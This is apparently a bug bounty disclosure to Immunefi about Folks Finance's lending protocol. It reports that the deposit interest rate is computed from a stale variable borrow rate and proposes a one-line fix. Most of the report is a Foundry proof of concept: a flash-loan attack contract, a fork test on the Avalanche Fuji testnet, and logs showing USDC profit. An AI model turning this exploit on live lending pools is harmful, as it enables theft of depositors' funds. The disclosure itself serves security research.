# Boost \_ Folks Finance 33533 - \[Smart Contract - Critical] depositDatainterestRate is not correct

Submitted on Mon Jul 22 2024 16:32:36 GMT-0400 (Atlantic Standard Time) by @ethprotector for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33533

Report type: Smart Contract

Report severity: Critical

Target: <https://testnet.snowtrace.io/address/0x96e957bF63B5361C5A2F45C97C46B8090f2745C2>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

In `HubPoolLogic.updateInterestRates` function `depositData.interestRate` is not calculated correctly.

## Vulnerability Details

```
function updateInterestRates(HubPoolState.PoolData storage poolData) internal {
        HubPoolState.PoolAmountDataCache memory poolAmountDataCache = getPoolAmountDataCache(poolData);
        uint256 totalDebt = poolAmountDataCache.variableBorrowTotalAmount + poolAmountDataCache.stableBorrowTotalAmount;
        uint256 utilisationRatio = MathUtils.calcUtilisationRatio(totalDebt, poolData.depositData.totalAmount);
        uint32 vr1 = poolData.variableBorrowData.vr1;

        // calculate new interest rates
        uint256 variableBorrowInterestRate = MathUtils.calcVariableBorrowInterestRate(
            poolData.variableBorrowData.vr0,
            vr1,
            poolData.variableBorrowData.vr2,
            utilisationRatio,
            poolData.depositData.optimalUtilisationRatio
        );
        uint256 stableBorrowInterestRate = MathUtils.calcStableBorrowInterestRate(
            vr1,
            poolData.stableBorrowData.sr0,
            poolData.stableBorrowData.sr1,
            poolData.stableBorrowData.sr2,
            poolData.stableBorrowData.sr3,
            utilisationRatio,
            poolData.depositData.optimalUtilisationRatio,
            MathUtils.calcStableDebtToTotalDebtRatio(poolAmountDataCache.stableBorrowTotalAmount, totalDebt),
            poolData.stableBorrowData.optimalStableToTotalDebtRatio
        );
        uint256 depositInterestRate = MathUtils.calcDepositInterestRate(
            utilisationRatio,
            MathUtils.calcOverallBorrowInterestRate(
                poolAmountDataCache.variableBorrowTotalAmount,
                poolAmountDataCache.stableBorrowTotalAmount,
                poolData.variableBorrowData.interestRate,
                poolData.stableBorrowData.averageInterestRate
            ),
            poolData.feeData.retentionRate
        );

        // update interest rates
        poolData.variableBorrowData.interestRate = variableBorrowInterestRate;
        poolData.stableBorrowData.interestRate = stableBorrowInterestRate;
        poolData.depositData.interestRate = depositInterestRate;

        emit InterestRatesUpdated(variableBorrowInterestRate, stableBorrowInterestRate, depositInterestRate);
    }
```

```
uint256 depositInterestRate = MathUtils.calcDepositInterestRate(
            utilisationRatio,
            MathUtils.calcOverallBorrowInterestRate(
                poolAmountDataCache.variableBorrowTotalAmount,
                poolAmountDataCache.stableBorrowTotalAmount,
                poolData.variableBorrowData.interestRate,
                poolData.stableBorrowData.averageInterestRate
            ),
            poolData.feeData.retentionRate
        );
```

poolData.variableBorrowData.interestRate is not current value. That is for last updates. So if the attacker uses flashloan, when the tx is complated, depositData.interestRate is changed.

## Impact Details

* Attacker can make the depositData.interestRate more than actual value. So when users (and the attacker) can get more collateral tokens than expected and others loss the money.
* Attacker can make the depositData.interestRate smaller than actual value and liquidate some loans.

## To fix it

use `variableBorrowInterestRate` instead of `poolData.variableBorrowData.interestRate,`

```
uint256 depositInterestRate = MathUtils.calcDepositInterestRate(
            utilisationRatio,
            MathUtils.calcOverallBorrowInterestRate(
                poolAmountDataCache.variableBorrowTotalAmount,
                poolAmountDataCache.stableBorrowTotalAmount,
                variableBorrowInterestRate,
                poolData.stableBorrowData.averageInterestRate
            ),
            poolData.feeData.retentionRate
        );
```

## Proof of concept

## Proof of Concept

In this PoC, I am going to show the first case (make the value more).

### Create `oracleManager.sol`

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./interfaces/DataTypes.sol";

contract OracleManager is IOracleManager{
    function processPriceFeed(uint8 poolId) external view returns (DataTypes.PriceFeed memory priceFeed) {
        priceFeed.price = 1000130000000000000;
        priceFeed.decimals = 6;
    }
}
```

After a year, the contract is break in the testnet. So I used fixed price oracleManager for this test.

### Create `FlashloanContract.sol`

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./PoC.sol";
import "./interfaces/IHubCircleTokenPool.sol";
import "./interfaces/ILoanManager.sol";
import "./interfaces/ISpokeCommon.sol";
import "./interfaces/ISpokeCircleToken.sol";
import "./interfaces/IHub.sol";


contract FlashloanContract is IERC3156FlashBorrower{
    ISpokeCommon private _spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
    ISpokeCircleToken private _spokeCircleToken = ISpokeCircleToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
    IHub private _hub = IHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
    IHubCircleTokenPool private _hubCirclePool = IHubCircleTokenPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34);
    IERC20 private constant usdcToken = IERC20(0x5425890298aed601595a70AB815c96711a31Bc65);
    ILoanManager private _loanManager = ILoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);

    address private attacker = 0x9FA562675ea0d73519F125AC52Aed6C684f7f2d6;
    address private user = 0xaA868dACbA543AacE30d69177b7d44047c2Fe27A;
    address private admin = 0x16870a6A85cD152229B97d018194d66740f932d6;

    uint256 private _1USDC = 1e6;
    uint256 private _1TOKEN = 1e18;

    bytes32 private attackerAccountId = bytes32("attackerAccountId");
    bytes32 private attackerLoanId = bytes32("attackerLoanId");
    bytes32 private userAccountId = bytes32("userAccountId");
    bytes32 private userLoanId = bytes32("userLoanId");

    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    bytes32 private refAccountId;

    uint8 private constant poolId = 128;


    bytes32 private stableLoanId = bytes32("stableLoanId");
    bytes32 private variableLoanId = bytes32("variableLoanId");

    Messages.MessageParams private params;

    constructor() {
        params = Messages.MessageParams({
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
    }

    function init() external {
        _spokeCommon.createAccount(params, attackerAccountId, refAccountId);
        _spokeCommon.createLoan(params, attackerAccountId, stableLoanId, 2, "stableLoan");
        _spokeCommon.createLoan(params, attackerAccountId, variableLoanId, 2, "variableLoan");
        usdcToken.approve(address(_spokeCircleToken), type(uint256).max);

        uint256 depositAmount = 20_000 * _1USDC;
        _spokeCircleToken.deposit(params, attackerAccountId, stableLoanId, depositAmount);
        _spokeCommon.borrow(params, attackerAccountId, stableLoanId, uint8(128), 1, 9480 * _1USDC, type(uint256).max);

        uint256 fAmount = 5_000 * _1USDC;
        bytes memory data = abi.encodePacked(stableLoanId, poolId, fAmount);
        _hub.directOperation(Messages.Action.WithdrawFToken, attackerAccountId, data);

    }

    function attack() external {
        bytes memory flashLoanData;
        _hubCirclePool.flashLoan(IERC3156FlashBorrower(address(this)), address(_hubCirclePool), 958520 * _1USDC * 10 / 8, flashLoanData);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        bytes memory data = abi.encodePacked(variableLoanId, poolId, amount);
        _hub.directOperation(Messages.Action.DepositFToken, attackerAccountId, data);

        uint256 borrowAmount = 858519 * _1USDC;

        printData();
        console.log("****************************************************************");
        for (uint256 i; i < 1; i++) {
            console.log("borrow");
            _spokeCommon.borrow(params, attackerAccountId, variableLoanId, poolId, 1, borrowAmount, 0);
            printData();
            console.log("repay");
            _spokeCircleToken.repay(params, attackerAccountId, variableLoanId, borrowAmount, 0);
            console.log("<<< depositData.interestRate increased after repay. >>>");
            printData();
            console.log("-----------------------------------------");
        }
        _hub.directOperation(Messages.Action.WithdrawFToken, attackerAccountId, data);

        _hubCirclePool.approve(address(_hubCirclePool), amount + fee);
        return RETURN_VALUE;
    }

    function withdraw() external {
        ILoanManager.UserLoanBorrow[] memory borrows;
        ILoanManager.UserLoanCollateral[] memory collaterals;
        (,,,,, borrows) = _loanManager.getUserLoan(stableLoanId);
        ILoanManager.UserLoanBorrow memory borrow = borrows[0];
        _spokeCircleToken.repay(params, attackerAccountId, stableLoanId, borrow.amount, 0);
        printData();
        bytes memory data = abi.encodePacked(stableLoanId, poolId, _hubCirclePool.balanceOf(address(this)));
        _hub.directOperation(Messages.Action.DepositFToken, attackerAccountId, data);

        (,,,, collaterals, borrows) = _loanManager.getUserLoan(stableLoanId);
        ILoanManager.UserLoanCollateral memory collateral = collaterals[0];

        borrow = borrows[0];

        _spokeCommon.withdraw(params, attackerAccountId, stableLoanId, poolId, 1, 15000 * _1USDC, true);
        usdcToken.transfer(msg.sender, usdcToken.balanceOf(address(this)));
        _hubCirclePool.transfer(msg.sender, _hubCirclePool.balanceOf(address(this)));
    }

    function printData() private {
        IHubCircleTokenPool.DepositData memory depositData = _hubCirclePool.getDepositData();
        IHubCircleTokenPool.VariableBorrowData memory variableBorrowData = _hubCirclePool.getVariableBorrowData();
        IHubCircleTokenPool.StableBorrowData memory stableBorrowData  = _hubCirclePool.getStableBorrowData();

        uint256 getLastUpdateTimestamp = _hubCirclePool.getLastUpdateTimestamp();
//        console.log("depositData.optimalUtilisationRatio", depositData.optimalUtilisationRatio);
//        console.log("depositData.totalAmount", depositData.totalAmount);
        console.log("depositData.interestRate", depositData.interestRate);
        console.log("depositData.interestIndex", depositData.interestIndex);
        console.log("variableBorrowData.totalAmount", variableBorrowData.totalAmount);
        console.log("variableBorrowData.interestRate", variableBorrowData.interestRate);
        console.log("variableBorrowData.interestIndex", variableBorrowData.interestIndex);
//        console.log("stableBorrowData.optimalStableToTotalDebtRatio", stableBorrowData.optimalStableToTotalDebtRatio);
//        console.log("stableBorrowData.rebalanceUpUtilisationRatio", stableBorrowData.rebalanceUpUtilisationRatio);
//        console.log("stableBorrowData.rebalanceUpDepositInterestRate", stableBorrowData.rebalanceUpDepositInterestRate);
//        console.log("stableBorrowData.rebalanceDownDelta", stableBorrowData.rebalanceDownDelta);
//        console.log("stableBorrowData.totalAmount", stableBorrowData.totalAmount);
        console.log("stableBorrowData.interestRate", stableBorrowData.interestRate);
        console.log("stableBorrowData.averageInterestRate", stableBorrowData.averageInterestRate);

//        console.log("getLastUpdateTimestamp", getLastUpdateTimestamp);

        console.log("utilizationRatio", (variableBorrowData.totalAmount + stableBorrowData.totalAmount) * 10 ** 18 / depositData.totalAmount);

        console.log("");
    }
}

```

### Test contract

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "../../src/interfaces/IHubCircleTokenPool.sol";
import "../../src/interfaces/ISpokeCommon.sol";
import "../../src/interfaces/ISpokeCircleToken.sol";
import "../../src/interfaces/IHub.sol";
import "../../src/interfaces/ILoanManager.sol";
import "../../src/OracleManager.sol";
import "../../src/interfaces/IBridgeRouter.sol";
import "../../src/FlashloanContract.sol";

contract FolksFinance is PoC {
    ISpokeCommon private _spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
    ISpokeCircleToken private _spokeCircleToken = ISpokeCircleToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
    IHub private _hub = IHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
    IHubCircleTokenPool private _hubCirclePool = IHubCircleTokenPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34);
    IERC20 private constant usdcToken = IERC20(0x5425890298aed601595a70AB815c96711a31Bc65);
    IBridgeRouter private _bridgeRouter = IBridgeRouter(0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837);
    ILoanManager private _loanManager = ILoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);

    address private attacker = 0x9FA562675ea0d73519F125AC52Aed6C684f7f2d6;
    address private user = 0xaA868dACbA543AacE30d69177b7d44047c2Fe27A;
    address private admin = 0x16870a6A85cD152229B97d018194d66740f932d6;

    FlashloanContract private _flashloanContract;

    uint256 private _1USDC = 1e6;

    bytes32 private attackerAccountId = bytes32("attackerAccountId");
    bytes32 private attackerLoanId = bytes32("attackerLoanId");
    bytes32 private userAccountId = bytes32("userAccountId");
    bytes32 private userLoanId = bytes32("userLoanId");

    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    bytes32 private refAccountId;

    Messages.MessageParams private _params;

    function setUp() virtual public {
        vm.createSelectFork("avalanche_fuji", 34899929);

        _flashloanContract = new FlashloanContract();


        // update pool config
        vm.startPrank(admin);

        IHubCircleTokenPool.ConfigData memory configData;
        configData.canMintFToken = true;
        configData.flashLoanSupported = true;
        configData.stableBorrowSupported = true;
        _hubCirclePool.updateConfigData(configData);

        OracleManager oracleManager = new OracleManager();
        _hubCirclePool.updateOracleManager(oracleManager);
        _loanManager.updateOracleManager(oracleManager);

        vm.stopPrank();

        _params = Messages.MessageParams({
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
    }

    function testDepositRate() public {
        {
            vm.startPrank(user);

            _spokeCommon.createAccount(_params, userAccountId, refAccountId);
            _spokeCommon.createLoan(_params, userAccountId, userLoanId, 2, "userLoanId");

            uint256 depositAmount = 1e5 * _1USDC;
            uint256 borrowAmount = 5e4 * _1USDC;
            usdcToken.approve(address(_spokeCircleToken), type(uint256).max);
            _spokeCircleToken.deposit(_params, userAccountId, userLoanId, depositAmount);
            _spokeCommon.borrow(_params, userAccountId, userLoanId, uint8(128), 1, borrowAmount, 0);

            bytes32 userLoan2 = bytes32("userLoan2");
            _spokeCommon.createLoan(_params, userAccountId, userLoan2, 2, "userLoan2");

            _spokeCircleToken.deposit(_params, userAccountId, userLoan2, depositAmount);
            _spokeCommon.borrow(_params, userAccountId, userLoan2, uint8(128), 1, 12_000, type(uint256).max);

            vm.stopPrank();
        }

        uint256 beforeUSDC = usdcToken.balanceOf(attacker);
        uint256 fAmount = _hubCirclePool.balanceOf(attacker);

        {
            vm.startPrank(attacker);

            usdcToken.approve(address(_spokeCircleToken), type(uint256).max);

            bytes32 _accountId = bytes32("_accountId");
            _spokeCommon.createAccount(_params, _accountId, refAccountId);

            // failed this tx
            _spokeCircleToken.deposit(_params, _accountId, _accountId, 8e5 * _1USDC);

            usdcToken.transfer(address(_flashloanContract), 1e6 * _1USDC);

            _flashloanContract.init();

            _flashloanContract.attack();

            bytes memory extraArgs;
            bytes32 messageId = 0xc973b2bb2aa65d8143ee026051dcbaa595f4cb5b5b6a8bbe20cdde04bc8d9e74;
            _bridgeRouter.reverseMessage(1, messageId, extraArgs);

            vm.stopPrank();
        }

        vm.warp(block.timestamp + 365 days);

        vm.prank(user);
        _spokeCircleToken.deposit(_params, attackerAccountId, bytes32(""), 1e5 * _1USDC);

        vm.prank(attacker);
        _flashloanContract.withdraw();

        console.log("beforeUSDC: ", beforeUSDC);
        console.log("fAmount: ", fAmount);
        console.log("afterUSDC: ", usdcToken.balanceOf(attacker));
        console.log("afterFAmount: ", _hubCirclePool.balanceOf(attacker));

        console.log("profit USDC: ", usdcToken.balanceOf(attacker) - beforeUSDC);
    }
}

```

### Output

```
Logs:
  depositData.interestRate 9233535301192619
  depositData.interestIndex 1000022518591804640
  variableBorrowData.totalAmount 50005000000
  variableBorrowData.interestRate 33400178096754556
  variableBorrowData.interestIndex 1000441722266616308
  stableBorrowData.interestRate 76360071238701822
  stableBorrowData.averageInterestRate 75346171890931368
  utilizationRatio 270303027644827473
  
  ****************************************************************
  borrow
  depositData.interestRate 127019302225650428
  depositData.interestIndex 1000022518591804640
  variableBorrowData.totalAmount 908524000000
  variableBorrowData.interestRate 22210161531424202760
  variableBorrowData.interestIndex 1000441722266616308
  stableBorrowData.interestRate 22232661531424202760
  stableBorrowData.averageInterestRate 75346171890931368
  utilizationRatio 4171399229713630414
  
  repay
  <<< depositData.interestRate increased after repay. >>>
  depositData.interestRate 4544892925919438915
  depositData.interestIndex 1000022518591804640
  variableBorrowData.totalAmount 50005000000
  variableBorrowData.interestRate 33400178096754556
  variableBorrowData.interestIndex 1000441722266616308
  stableBorrowData.interestRate 76360071238701822
  stableBorrowData.averageInterestRate 75346171890931368
  utilizationRatio 270303027644827473
  
  -----------------------------------------
  depositData.interestRate 7035480095729247
  depositData.interestIndex 5545017789099838130
  variableBorrowData.totalAmount 50005000000
  variableBorrowData.interestRate 31018965439825958
  variableBorrowData.interestIndex 1034420951267128594
  stableBorrowData.interestRate 75407586175930383
  stableBorrowData.averageInterestRate 75342362580314536
  utilizationRatio 229822412477041312
  
  beforeUSDC:  4391108956478723
  fAmount:  0
  afterUSDC:  4391172131745559
  afterFAmount:  0
  profit USDC:  63175266836

```
